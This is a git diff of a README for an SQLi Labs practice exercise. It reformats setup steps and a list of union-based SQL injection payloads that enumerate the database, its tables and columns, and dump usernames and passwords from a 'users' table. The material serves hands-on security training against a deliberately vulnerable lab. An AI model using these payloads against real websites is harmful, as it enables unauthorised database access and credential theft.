@@ -1,14 +1,15 @@
 __SQLI LABS__
 ==========
 First we have to setup the lab:
-	* install apache2 webserver by ">sudo apt install apache2"
-	* install mysql by ">sudo apt-get install mysql-srver"
-	* install php7
-	* git clone the repository of the lab and start all the service required
+
+* install apache2 webserver by ">sudo apt install apache2"
+* install mysql by ">sudo apt-get install mysql-srver"
+* install php7
+* git clone the repository of the lab and start all the service required
 
 #OBJECTIVE
 ==========
-dump the contents of the databse using sqli
+_dump the contents of the databse using sqli_
  
 ##LESS-1
 ========
@@ -19,11 +20,11 @@ dump the contents of the databse using sqli
 
  ##payloads to dump
 ---------------------
-check no: of table included = "/?id=1'order by 1,2,3,4--+"
-to find the name of data base= "/id=-1' union select 1,database(),3--+"
-to find table name 	    = "/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+"
-to find the column name	    = "/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+"
-to find the data 	    = "/?id=-1' union select 1,group_concat(username),concat(password) from users"
+check no: of table included 	=```/?id=1'order by 1,2,3,4--+"```
+to find the name of data base	= ```/id=-1' union select 1,database(),3--+```
+to find table name 	    	= ```/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+```
+to find the column name	    	=```/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+```
+to find the data 	    	=``` /?id=-1' union select 1,group_concat(username),concat(password) from users```
 
 contents of database
 --------------------
